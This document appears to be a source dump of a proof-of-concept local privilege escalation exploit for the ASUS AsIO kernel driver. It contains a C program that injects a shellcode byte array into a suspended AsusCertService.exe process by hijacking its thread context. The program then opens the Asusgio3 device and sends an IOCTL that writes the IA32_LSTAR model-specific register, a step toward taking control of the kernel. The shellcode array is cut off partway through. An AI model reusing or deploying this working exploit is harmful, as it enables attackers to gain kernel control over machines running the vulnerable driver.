Project Path: arc_gmh5225_AsIO-Exploit_vwe3f97r

Source Tree:

```txt
arc_gmh5225_AsIO-Exploit_vwe3f97r
├── AsIO-LPE
│   ├── AsIO-LPE.vcxproj
│   ├── AsIO-LPE.vcxproj.filters
│   ├── main.c
│   └── shellcode.h
├── AsIO-LPE.sln
├── AsIO-shellcode
│   ├── AsIO-shellcode.vcxproj
│   ├── AsIO-shellcode.vcxproj.filters
│   ├── ntdef.h
│   └── shellcode.cpp
├── AsIO-shellcode.sln
└── README.md

```

`AsIO-LPE.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30907.101
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AsIO-LPE", "AsIO-LPE\AsIO-LPE.vcxproj", "{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AsIO-shellcode", "..\AsIO-shellcode\AsIO-shellcode\AsIO-shellcode.vcxproj", "{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Debug|x64.ActiveCfg = Debug|x64
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Debug|x64.Build.0 = Debug|x64
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Debug|x86.ActiveCfg = Debug|Win32
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Debug|x86.Build.0 = Debug|Win32
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Release|x64.ActiveCfg = Release|x64
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Release|x64.Build.0 = Release|x64
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Release|x86.ActiveCfg = Release|Win32
		{2E6046F9-D92C-4CEC-A03A-DA666D5BC264}.Release|x86.Build.0 = Release|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x64.ActiveCfg = Debug|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x64.Build.0 = Debug|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x86.ActiveCfg = Debug|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Debug|x86.Build.0 = Debug|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x64.ActiveCfg = Release|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x64.Build.0 = Release|x64
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x86.ActiveCfg = Release|Win32
		{644EA8E4-891C-4C4D-BD75-D438A4C9B36D}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D3B29990-2F37-4ABE-80E5-BAB3F39BD2DE}
	EndGlobalSection
EndGlobal

```

`AsIO-LPE/AsIO-LPE.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{2e6046f9-d92c-4cec-a03a-da666d5bc264}</ProjectGuid>
    <RootNamespace>AsIOLPE</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="shellcode.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`AsIO-LPE/AsIO-LPE.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="shellcode.h">
      <Filter>Source Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`AsIO-LPE/main.c`:

```c
#include <Windows.h>
#include <stdio.h>

#include "shellcode.h"

#define SHELLCODE_OFFSET 0xa0

#define ASIO_RDMSR_IOCTL 0xA0406458
#define ASIO_WRMSR_IOCTL 0xA040A45C

#pragma pack(1)
typedef struct _ASIO_WRMSR
{
	ULONG Msr;
	ULONGLONG Value;
} ASIO_WRMSR;

int main( void )
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO startinfo;

	RtlSecureZeroMemory( &pinfo, sizeof( pinfo ) );
	RtlSecureZeroMemory( &startinfo, sizeof( startinfo ) );

	CONTEXT ctx;
	RtlSecureZeroMemory( &ctx, sizeof( ctx ) );

	if ( !CreateProcessW( L"AsusCertService.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startinfo, &pinfo ) )
		goto FINISH;

	printf( "[*] created suspended process: AsusCertService.exe\n" );

	SIZE_T bytes = 0;

	LPVOID base = VirtualAllocEx( pinfo.hProcess, NULL, sizeof( shellcode ), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if ( !base )
		goto FINISH;

	printf( "[*] allocated shellcode page: 0x%08x\n", ( DWORD ) base );

	WriteProcessMemory( pinfo.hProcess, base, shellcode, sizeof( shellcode ), &bytes );
	printf( "[*] wrote %i bytes to 0x%08x\n", bytes, ( DWORD ) base );

	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext( pinfo.hThread, &ctx );

	ctx.Eip = ( DWORD ) base + SHELLCODE_OFFSET;

	printf( "[*] modified thread context\n" );

	SetThreadContext( pinfo.hThread, &ctx );
	ResumeThread( pinfo.hThread );
	
	HANDLE dev_handle = INVALID_HANDLE_VALUE;
	do
	{
		dev_handle = CreateFileW( L"\\\\.\\Asusgio3", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	} while ( dev_handle == INVALID_HANDLE_VALUE );

	printf( "[*] obtained handle to device\n" );

	ASIO_WRMSR wrmsr_cmd;
	wrmsr_cmd.Msr = 0xC0000082;
	wrmsr_cmd.Value = 0;

	ULONGLONG msr_value = 0;

	SIZE_T ret = 0;

	if ( DeviceIoControl( dev_handle, ASIO_WRMSR_IOCTL, &wrmsr_cmd, sizeof( wrmsr_cmd ), &msr_value, sizeof( msr_value ), &ret, NULL ) )
		printf( "IA32_LSTAR: 0x%llx\n", msr_value );

	CloseHandle( dev_handle );

FINISH:
	TerminateProcess( pinfo.hProcess, 0 );

	CloseHandle( pinfo.hThread );
	CloseHandle( pinfo.hProcess );

	printf( "[!] Error: 0x%08x\n", GetLastError( ) );
	getchar( );

	return 0;
}
```

`AsIO-LPE/shellcode.h`:

```h
#pragma once

static const unsigned char shellcode[ 1536 ] = {
	0x00, 0x00, 0x00, 0x00, 0xF0, 0x37, 0xF1, 0x60, 0x00, 0x00, 0x00, 0x00,
	0x0D, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x1C, 0x10, 0x00, 0x00,
	0x1C, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x1C, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x1C, 0x10, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00,
	0xA0, 0x10, 0x00, 0x00, 0xFC, 0x03, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
	0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
	0x04, 0x00, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72,
	0x63, 0x24, 0x30, 0x31, 0x00, 0x00, 0x00, 0x00, 0x60, 0x30, 0x00, 0x00,
	0x98, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x55, 0x8B, 0xEC, 0x64, 0xA1, 0x30, 0x00, 0x00,
	0x00, 0x81, 0xEC, 0x9C, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40,
	0x0C, 0x8B, 0x00, 0x8B, 0x50, 0x18, 0xB8, 0x4D, 0x5A, 0x00, 0x00, 0x66,
	0x39, 0x02, 0x0F, 0x85, 0xCD, 0x03, 0x00, 0x00, 0x53, 0x8B, 0x5A, 0x3C,
	0x81, 0x3C, 0x13, 0x50, 0x45, 0x00, 0x00, 0x0F, 0x85, 0xBB, 0x03, 0x00,
	0x00, 0x8B, 0x44, 0x13, 0x78, 0x03, 0xC2, 0x56, 0x57, 0x8B, 0x78, 0x24,
	0x8B, 0x48, 0x20, 0x03, 0xFA, 0x8B, 0x70, 0x1C, 0x03, 0xCA, 0x8B, 0x40,
	0x18, 0x03, 0xF2, 0x89, 0x7D, 0xF8, 0x33, 0xFF, 0x89, 0x4D, 0xF0, 0x89,
	0x75, 0xFC, 0x89, 0x45, 0xF4, 0x85, 0xC0, 0x74, 0x44, 0x8B, 0x45, 0xF8,
	0x8B, 0x0C, 0xB9, 0x03, 0xCA, 0x0F, 0xB7, 0x04, 0x78, 0x8B, 0x04, 0x86,
	0x33, 0xF6, 0x03, 0xC2, 0x89, 0x45, 0xE0, 0x8A, 0x01, 0x84, 0xC0, 0x74,
	0x1A, 0x0F, 0xBE, 0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0, 0x8A, 0x01, 0xC1,
	0xC6, 0x03, 0x46, 0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE, 0x3E, 0x67, 0x51,
	0xCD, 0x74, 0x15, 0x47, 0x3B, 0x7D, 0xF4, 0x73, 0x08, 0x8B, 0x4D, 0xF0,
	0x8B, 0x75, 0xFC, 0xEB, 0xBC, 0xC7, 0x45, 0xE0, 0x00, 0x00, 0x00, 0x00,
	0x8B, 0x44, 0x13, 0x78, 0x33, 0xFF, 0x8B, 0x5C, 0x10, 0x24, 0x03, 0xC2,
	0x03, 0xDA, 0x89, 0x5D, 0xFC, 0x8B, 0x48, 0x20, 0x8B, 0x70, 0x1C, 0x03,
	0xCA, 0x8B, 0x58, 0x18, 0x03, 0xF2, 0x89, 0x4D, 0xF8, 0x89, 0x75, 0xF4,
	0x85, 0xDB, 0x74, 0x4F, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x8B, 0x45, 0xFC, 0x0F, 0xB7, 0x04, 0x78, 0x8B, 0x04, 0x86, 0x33, 0xF6,
	0x03, 0xC2, 0x89, 0x45, 0xF0, 0x8B, 0x04, 0xB9, 0x8A, 0x0C, 0x10, 0x03,
	0xC2, 0x84, 0xC9, 0x74, 0x1D, 0x0F, 0x1F, 0x00, 0x0F, 0xBE, 0xC9, 0x8D,
	0x40, 0x01, 0x33, 0xF1, 0x8A, 0x08, 0xC1, 0xC6, 0x03, 0x46, 0x84, 0xC9,
	0x75, 0xEE, 0x81, 0xFE, 0x4A, 0xBC, 0xE2, 0x71, 0x74, 0x14, 0x47, 0x3B,
	0xFB, 0x73, 0x08, 0x8B, 0x4D, 0xF8, 0x8B, 0x75, 0xF4, 0xEB, 0xB9, 0xC7,
	0x45, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x5A, 0x3C, 0x03, 0xDA, 0x8B,
	0xC3, 0x8B, 0x40, 0x78, 0x03, 0xC2, 0x8B, 0x78, 0x24, 0x8B, 0x48, 0x20,
	0x03, 0xFA, 0x8B, 0x70, 0x1C, 0x03, 0xCA, 0x8B, 0x40, 0x18, 0x03, 0xF2,
	0x89, 0x7D, 0xFC, 0x33, 0xFF, 0x89, 0x4D, 0xEC, 0x89, 0x75, 0xE8, 0x89,
	0x45, 0xF8, 0x85, 0xC0, 0x74, 0x4A, 0x66, 0x90, 0x8B, 0x45, 0xFC, 0x8B,
	0x0C, 0xB9, 0x03, 0xCA, 0x0F, 0xB7, 0x04, 0x78, 0x8B, 0x04, 0x86, 0x33,
	0xF6, 0x03, 0xC2, 0x89, 0x45, 0xF4, 0x8A, 0x01, 0x84, 0xC0, 0x74, 0x1E,
	0x0F, 0x1F, 0x40, 0x00, 0x0F, 0xBE, 0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0,
	0x8A, 0x01, 0xC1, 0xC6, 0x03, 0x46, 0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE,
	0xE5, 0x18, 0x77, 0x54, 0x74, 0x15, 0x47, 0x3B, 0x7D, 0xF8, 0x73, 0x08,
	0x8B, 0x4D, 0xEC, 0x8B, 0x75, 0xE8, 0xEB, 0xB8, 0xC7, 0x45, 0xF4, 0x00,
	0x00, 0x00, 0x00, 0x8B, 0x43, 0x78, 0x33, 0xFF, 0x8B, 0x5C, 0x10, 0x1C,
	0x03, 0xC2, 0x03, 0xDA, 0x89, 0x5D, 0xFC, 0x8B, 0x48, 0x20, 0x8B, 0x70,
	0x24, 0x03, 0xCA, 0x8B, 0x40, 0x18, 0x03, 0xF2, 0x89, 0x4D, 0xEC, 0x89,
	0x75, 0xE4, 0x89, 0x45, 0xE8, 0x85, 0xC0, 0x74, 0x52, 0x0F, 0x1F, 0x80,
	0x00, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x04, 0x7E, 0x33, 0xF6, 0x8B, 0x0C,
	0xB9, 0x03, 0xCA, 0x8B, 0x1C, 0x83, 0x03, 0xDA, 0x8A, 0x01, 0x89, 0x5D,
	0xF8, 0x84, 0xC0, 0x74, 0x21, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0xBE, 0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0, 0x8A, 0x01, 0xC1, 0xC6,
	0x03, 0x46, 0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE, 0x8E, 0x2E, 0x4C, 0xC2,
	0x74, 0x18, 0x47, 0x3B, 0x7D, 0xE8, 0x73, 0x0B, 0x8B, 0x4D, 0xEC, 0x8B,
	0x5D, 0xFC, 0x8B, 0x75, 0xE4, 0xEB, 0xB5, 0xC7, 0x45, 0xF8, 0x00, 0x00,
	0x00, 0x00, 0x8B, 0x42, 0x3C, 0x33, 0xFF, 0x03, 0xC2, 0x8B, 0x40, 0x78,
	0x03, 0xC2, 0x8B, 0x48, 0x20, 0x8B, 0x58, 0x1C, 0x03, 0xCA, 0x8B, 0x70,
	0x24, 0x03, 0xDA, 0x8B, 0x40, 0x18, 0x03, 0xF2, 0x89, 0x4D, 0xE8, 0x89,
	0x5D, 0xEC, 0x89, 0x75, 0xFC, 0x89, 0x45, 0xE4, 0x85, 0xC0, 0x74, 0x41,
	0x0F, 0xB7, 0x04, 0x7E, 0x33, 0xF6, 0x8B, 0x0C, 0xB9, 0x03, 0xCA, 0x8B,
	0x1C, 0x83, 0x03, 0xDA, 0x8A, 0x01, 0x84, 0xC0, 0x74, 0x1A, 0x0F, 0xBE,
	0xC0, 0x8D, 0x49, 0x01, 0x33, 0xF0, 0x8A, 0x01, 0xC1, 0xC6, 0x03, 0x46,
	0x84, 0xC0, 0x75, 0xEE, 0x81, 0xFE, 0x0A, 0xD8, 0xCC, 0x47, 0x74, 0x13,
	0x47, 0x3B, 0x7D, 0xE4, 0x73, 0x0B, 0x8B, 0x4D, 0xE8, 0x8B, 0x5D, 0xEC,
	0x8B, 0x75, 0xFC, 0xEB, 0xBF, 0x33, 0xDB, 0x8B, 0x45, 0xE0, 0x85, 0xC0,
	0x0F, 0x84, 0x44, 0x01, 0x00, 0x00, 0x83, 0x7D, 0xF0, 0x00, 0x0F, 0x84,
	0x3A, 0x01, 0x00, 0x00, 0x8B, 0x75, 0xF4, 0x85, 0xF6, 0x0F, 0x84, 0x2F,
	0x01, 0x00, 0x00, 0x8B, 0x7D, 0xF8, 0x85, 0xFF, 0x0F, 0x84, 0x24, 0x01,
	0x00, 0x00, 0x85, 0xDB, 0x0F, 0x84, 0x1C, 0x01, 0x00, 0x00, 0x33, 0xC9,
	0xC7, 0x45, 0xB8, 0x5C, 0x00, 0x44, 0x00, 0x66, 0x89, 0x4D, 0xD8, 0x8D,
	0x4D, 0xB8, 0x51, 0x8D, 0x4D, 0x84, 0xC7, 0x45, 0xBC, 0x65, 0x00, 0x76,
	0x00, 0x51, 0xC7, 0x45, 0xC0, 0x69, 0x00, 0x63, 0x00, 0xC7, 0x45, 0xC4,
	0x65, 0x00, 0x5C, 0x00, 0xC7, 0x45, 0xC8, 0x41, 0x00, 0x73, 0x00, 0xC7,
	0x45, 0xCC, 0x75, 0x00, 0x73, 0x00, 0xC7, 0x45, 0xD0, 0x67, 0x00, 0x69,
	0x00, 0xC7, 0x45, 0xD4, 0x6F, 0x00, 0x33, 0x00, 0xFF, 0xD0, 0x6A, 0x00,
	0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x00, 0x8D, 0x45,
	0x84, 0xC7, 0x45, 0xDC, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x98, 0x8D,
	0x85, 0x7C, 0xFF, 0xFF, 0xFF, 0x6A, 0x00, 0x50, 0x8D, 0x45, 0x90, 0xC7,
	0x45, 0x90, 0x18, 0x00, 0x00, 0x00, 0x50, 0x68, 0x00, 0x00, 0x00, 0xC0,
	0x8D, 0x45, 0xDC, 0xC7, 0x45, 0x94, 0x00, 0x00, 0x00, 0x00, 0x50, 0xC7,
	0x45, 0x9C, 0x40, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xA0, 0x00, 0x00, 0x00,
	0x00, 0xC7, 0x45, 0xA4, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x55, 0xF0, 0x85,
	0xC0, 0x0F, 0x88, 0x77, 0x00, 0x00, 0x00, 0xB9, 0x18, 0x00, 0x00, 0x00,
	0x8D, 0x85, 0x64, 0xFF, 0xFF, 0xFF, 0xC6, 0x00, 0x00, 0x8D, 0x40, 0x01,
	0x83, 0xE9, 0x01, 0x75, 0xF5, 0x8D, 0x45, 0xB4, 0x89, 0x4D, 0xB4, 0x50,
	0x6A, 0x18, 0x8D, 0x85, 0x64, 0xFF, 0xFF, 0xFF, 0x50, 0x51, 0x6A, 0xFF,
	0xFF, 0xD3, 0x85, 0xC0, 0x78, 0x48, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF,
	0x6A, 0x04, 0x89, 0x45, 0xB0, 0x8D, 0x45, 0x8C, 0x50, 0x6A, 0x04, 0x8D,
	0x45, 0xB0, 0x50, 0x68, 0x90, 0xA4, 0x40, 0xA0, 0x8D, 0x85, 0x7C, 0xFF,
	0xFF, 0xFF, 0x50, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0x75, 0xDC,
	0xFF, 0xD7, 0x85, 0xC0, 0x78, 0x18, 0xC7, 0x45, 0xA8, 0xFF, 0xFF, 0xFF,
	0xFF, 0xC7, 0x45, 0xAC, 0xFF, 0xFF, 0xFF, 0xFF, 0x8D, 0x45, 0xA8, 0x50,
	0x6A, 0x00, 0xFF, 0xD6, 0xEB, 0xF6, 0x5F, 0x5E, 0x5B, 0xCC, 0x33, 0xC0,
	0x8B, 0xE5, 0x5D, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
